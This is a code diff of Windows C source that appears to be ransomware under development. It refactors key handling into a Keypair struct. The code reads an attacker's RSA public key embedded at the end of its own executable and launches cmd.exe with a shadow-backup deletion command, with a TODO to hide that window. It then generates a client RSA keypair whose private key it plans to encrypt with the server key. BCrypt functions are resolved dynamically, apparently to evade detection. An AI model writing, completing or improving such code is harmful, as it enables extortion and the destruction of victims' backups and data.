@@ -1,5 +1,3 @@
-#include <windows.h>
-
 #include "util.h"
 #include "crypt.h"
 
@@ -8,42 +6,37 @@
 
 #define SIZEOF_ARRAY(arr)	(sizeof(arr) / sizeof(arr[0]))
 
-char *
-ftok(char *self, HINSTANCE *hinst)
+void
+ftok(char *self, HINSTANCE *hinst, Keypair *k)
 {
 	FILE *f;
 	HRSRC rs;
 	HGLOBAL grs;
 	BCRYPT_ALG_HANDLE alghandle;
-	BCRYPT_KEY_HANDLE hkey;
-	unsigned long pubkeysize;
-	char *pubkey;
 	/* Read the key size */
 	if (!(f = fopen(self, "rb")))
 		die("Failed to open self");
 	if (fseek(f, -sizeof(unsigned), SEEK_END))
 		die("Failed to fseek self");
-	if (fread(&pubkeysize, 1, sizeof(unsigned), f) != sizeof(unsigned))
+	if (fread(&(k->size), 1, sizeof(unsigned), f) != sizeof(unsigned))
 		die("Failed to fread pubkey");
 	/* malloc key */
-	if (!(pubkey = malloc(pubkeysize)))
+	if (!(k->blob = malloc(k->size)))
 		die("Failed to malloc pubkey");
 	/* Read the key, SEEK_CUR -> skip last 4 bytes sizeof(unsigned) */
-	if (fseek(f, -(pubkeysize + sizeof(unsigned)), SEEK_CUR))
+	if (fseek(f, -(k->size + sizeof(unsigned)), SEEK_CUR))
 		die("Failed to fseek self");
-	if (fread(pubkey, 1, pubkeysize, f) != pubkeysize)
+	if (fread(k->blob, 1, k->size, f) != k->size)
 		die("Failed to fread pubkey");
 	fclose(f);
 	/* BCryptOpenAlgorithmProvider */
 	if (adrof(*hinst, "BCryptOpenAlgorithmProvider")(&alghandle, BCRYPT_RSA_ALGORITHM, 0, 0))
 		die("Failed to call BCryptOpenAlgorithmProvider");
 	/* BCryptImportKeyPair */
-	if (adrof(*hinst, "BCryptImportKeyPair")(alghandle, 0, BCRYPT_RSAPUBLIC_BLOB, &hkey, pubkey, pubkeysize, 0))
+	if (adrof(*hinst, "BCryptImportKeyPair")(alghandle, 0, BCRYPT_RSAPUBLIC_BLOB, &(k->khandle), k->blob, k->size, 0))
 		die("Failed to BCryptImportKeyPair");
 	/* BCryptCloseAlgorithmProvider */
 	adrof(*hinst, "BCryptCloseAlgorithmProvider")(alghandle, 0);
-
-	return hkey;
 }
 
 int
@@ -63,31 +56,36 @@ main(int argc, char **argv)
 	 * [] Save encrypted AES key
 	*/
 	HINSTANCE hinst;
-	BCRYPT_KEY_HANDLE skey, ckey;
-	BCRYPT_ALG_HANDLE alghandle;
+	Keypair *sk, *ck;
 
 	if (!(hinst = LoadLibrary("bcrypt.dll")))
 		die("Failed to load bcrypt.dll");
 
-	skey = ftok(argv[0], &hinst);
-
 	ShellExecute(NULL, "open", "cmd.exe", RM_SHADOW_BACKUPS, NULL, SW_SHOW); /* TODO: Change to SW_HIDE */
 
+	/* malloc Keypair structs */
+	if (!(ck = malloc(sizeof(Keypair))))
+		die("Failed to malloc Keypair struct");
+	if (!(sk = malloc(sizeof(Keypair))))
+		die("Failed to malloc Keypair struct");
+	/* Read server pubkey */
+	ftok(argv[0], &hinst, sk);
 	/* Gen RSA keypair */
-	/* BCryptOpenAlgorithmProvider */
-	if (adrof(hinst,"BCryptOpenAlgorithmProvider")(&alghandle, BCRYPT_RSA_ALGORITHM, 0, 0))
-			die("Failed call to BCryptOpenAlgorithmProvider");
-	/* BCryptGenerateKeyPair */
-	if (adrof(hinst, "BCryptGenerateKeyPair")(alghandle, &ckey, 2048, 0))
-			die("Failed call to BCryptGenerateKeyPair");
-	/* BCryptFinalizeKeyPair */
-	if (adrof(hinst, "BCryptFinalizeKeyPair")(ckey, 0))
-			die("Failed call to BCryptFinalizeKeyPair");
-
+	rsa_gen_key(&hinst, ck);
+	/* key to privkey blob */
+	ktob(&hinst, ck, BCRYPT_RSAPRIVATE_BLOB);
+	/* encrypt privkey with server pubkey */
 
 	/* BCryptDestroyKey */
-	adrof(hinst, "BCryptDestroyKey")(skey);
-	adrof(hinst, "BCryptDestroyKey")(ckey);
+	if (adrof(hinst, "BCryptDestroyKey")(ck->khandle))
+		die("Failed to BCryptDestroyKey");
+	if (adrof(hinst, "BCryptDestroyKey")(sk->khandle))
+		die("Failed to BCryptDestroyKey");
+	/* cleanup */
+	free(sk->blob);
+	free(ck->blob);
+	free(ck);
+	free(sk);
 	FreeLibrary(hinst);
 	return 0;
 }
